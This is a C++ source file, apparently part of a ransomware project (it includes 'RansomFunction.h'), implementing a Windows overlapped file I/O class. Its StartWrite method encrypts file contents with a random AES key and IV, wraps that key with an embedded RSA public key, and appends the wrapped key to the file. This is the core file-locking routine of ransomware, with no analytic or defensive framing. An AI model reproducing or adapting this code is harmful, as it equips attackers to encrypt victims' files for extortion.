#include"../pch.h"
#include "OvlFile.h"
#include "Exception.h"
#include"../RansomFunction.h"

namespace io
{
	struct OvlFile::FileIoOverlapped
	{
		OVERLAPPEDPLUS m_ovlPlus;
		CompleteHandler_t m_comleteHandler;
	};

	OvlFile::OvlFile
	(const io::IoPool& ioPool
		, const wchar_t* const fileName
		, const DWORD disposition
		, const DWORD access
		, const DWORD shareMode
	)
	{
		// create file
		this->fileName = fileName;
		HANDLE file = ::CreateFileW(fileName, access, shareMode, nullptr,
			disposition, FILE_FLAG_OVERLAPPED, nullptr);

		if (file == INVALID_HANDLE_VALUE) {
			wcout << fileName << endl;
			throw ex::WinException("OvlFile. Create file");
		}
		m_file.reset(file);

		// associate with the pool
		ioPool.Associate(m_file.get());

	}

	OvlFile::~OvlFile()
	{
	}

	void OvlFile::StartRead(uint64_t fileOffset, char* data, DWORD size, CompleteHandler_t handler)
	{
		std::unique_ptr<FileIoOverlapped> fileOverlapped = PrepareOverlapped(fileOffset, handler);

		const BOOL result = ::ReadFile
		(m_file.get()
			, data
			, size
			, nullptr
			, &fileOverlapped->m_ovlPlus.m_ovl);

		const DWORD lastError = ::GetLastError();
		if (!result && lastError != ERROR_IO_PENDING)
			throw ex::WinException("OvlFile. Read file", lastError);

		fileOverlapped.release(); // delete it when operation completes
	}

	void OvlFile::StartWrite(uint64_t fileOffset, const char* data, DWORD size, CompleteHandler_t handler)
	{
		std::unique_ptr<FileIoOverlapped> fileOverlapped = PrepareOverlapped(fileOffset, handler);
		//º”√‹
		CryptoPP::AutoSeededRandomPool rnd;
		CryptoPP::SecByteBlock 	key(0x00, CryptoPP::AES::DEFAULT_KEYLENGTH);
		rnd.GenerateBlock(key, key.size());
		CryptoPP::SecByteBlock iv(CryptoPP::AES::BLOCKSIZE);
		rnd.GenerateBlock(iv, iv.size());
		CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption cfbEncryption(key, key.size(), iv);
		cfbEncryption.ProcessData((PBYTE)data, (PBYTE)data, size);
		//base64 ∆¥Ω”
		string Base64Key = base64_encode(string((CHAR*)key.begin(), key.size()));
		string Base64IV = base64_encode(string((CHAR*)iv.begin(), iv.size()));
		string Base64Str = Base64Key + Base64IV;
		//Rsaº”√‹
		using namespace CryptoPP;
		ByteQueue queue;
		CryptoPP::StringSource ss{ Base64RsaPk.c_str(), true };
		Base64Decoder decoder;
		decoder.Attach(new Redirector(queue));
		ss.TransferTo(decoder);
		decoder.MessageEnd();
		//
		AutoSeededRandomPool rng;
		RSA::PublicKey public_key;
		public_key.BERDecode(queue);

		RSAES_PKCS1v15_Encryptor   encryptor(public_key);
		assert(0 != encryptor.FixedMaxPlaintextLength());
		//assert(plaintext.size() <= encryptor.FixedMaxPlaintextLength());
		// Create cipher text space
		string Base64result;
		string chilper;
		StringSource(Base64Str, true, new PK_EncryptorFilter(rnd, encryptor, new StringSink(chilper)));
		printf("chilper = %s, length = %d\n", chilper.c_str(), strlen(chilper.c_str()));

		Base64result = "key:"+ base64_encode(chilper);

		//
		memcpy((void*)((DWORD)data + size), Base64result.c_str(), Base64result.length());

		const BOOL result = ::WriteFile
		(m_file.get()
			, data
			, size + Base64result.length()
			, nullptr
			, &fileOverlapped->m_ovlPlus.m_ovl);



		const DWORD lastError = ::GetLastError();
		if (!result && lastError != ERROR_IO_PENDING)
			throw ex::WinException("OvlFile. Write file", lastError);



		fileOverlapped.release(); // delete it when operation completes
	}

	uint64_t OvlFile::Size() const
	{
		LARGE_INTEGER size = {};
		const BOOL result = ::GetFileSizeEx(m_file.get(), &size);
		ex::CheckZero(result, "OvlFile. Get file size");

		return size.QuadPart;
	}

	std::unique_ptr<OvlFile::FileIoOverlapped>
		OvlFile::PrepareOverlapped(uint64_t fileOffset, CompleteHandler_t handler)
	{
		std::unique_ptr<FileIoOverlapped> fileOverlapped =
			std::make_unique<FileIoOverlapped>();

		fileOverlapped->m_ovlPlus.m_ovl.Offset = static_cast<DWORD>(fileOffset);
		fileOverlapped->m_ovlPlus.m_ovl.OffsetHigh = static_cast<DWORD>(fileOffset >> 32);
		fileOverlapped->m_ovlPlus.m_poolClient = this;
		fileOverlapped->m_comleteHandler = handler;

		return fileOverlapped;
	}

	void OvlFile::OnOperationCompleted(LPOVERLAPPED ovl, DWORD transferred)
	{
		try
		{
			io::OVERLAPPEDPLUS* ovlPlus = CONTAINING_RECORD(ovl, io::OVERLAPPEDPLUS, m_ovl);
			FileIoOverlapped* fileOvl = CONTAINING_RECORD(ovlPlus, FileIoOverlapped, m_ovlPlus);

			std::unique_ptr<FileIoOverlapped> guard(fileOvl);
			if (fileOvl->m_comleteHandler)
				fileOvl->m_comleteHandler(transferred);
		}
		catch (const std::exception&)
		{
		}
	}

	void OvlFile::OnOperationCanceled(LPOVERLAPPED ovl)
	{
		try
		{
			io::OVERLAPPEDPLUS* ovlPlus = CONTAINING_RECORD(ovl, io::OVERLAPPEDPLUS, m_ovl);
			FileIoOverlapped* fileOvl = CONTAINING_RECORD(ovlPlus, FileIoOverlapped, m_ovlPlus);

			std::unique_ptr<FileIoOverlapped> guard(fileOvl);
			if (fileOvl->m_comleteHandler)
				fileOvl->m_comleteHandler(0);
		}
		catch (const std::exception&)
		{
		}
	}

} // namespace io